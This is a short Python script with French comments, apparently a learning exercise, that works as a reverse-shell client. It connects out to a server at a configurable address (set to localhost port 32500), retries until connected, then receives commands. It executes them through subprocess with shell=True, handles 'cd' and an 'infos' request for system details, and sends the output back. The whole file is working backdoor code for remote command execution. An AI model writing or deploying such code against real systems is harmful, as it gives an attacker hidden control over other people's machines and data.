# socket
#bind (ip,port) 127.0.0.1 -> localhost
# listen
#
#accept -> socket / (ip,port)
# close

import socket
from sys import platform 
import time 
import subprocess
import platform 
import os

HOST_IP="127.0.0.1"
HOST_PORT= 32500
MAX_DATA_SIZE= 1024




print (f"Connexion au serveur  {HOST_IP}, port {HOST_PORT}...")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP,HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print(f"Connecté au serveur")
        break
    
# Reception des données
while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande= commande_data.decode()
    print("Commande : ", commande)

    commande_split= commande.split(" ")

    if commande == "infos":
        reponse= platform.platform() +" " + os.getcwd()
         
    elif len(commande_split) ==2  and commande_split[0] =="cd":
        try:
            os.chdir((commande_split[1]).strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'existe pas"
    else:
        resultat = subprocess.run(commande,shell=True,
        capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr

        if not reponse or len(reponse)==0:
            reponse = " "

    data_len = len(reponse.encode())
    header = str(len(reponse.encode())).zfill(13)
    print('header:', header)
    s.sendall(header.encode())  
    if data_len > 0 :  
        s.sendall(reponse.encode())

s.close()

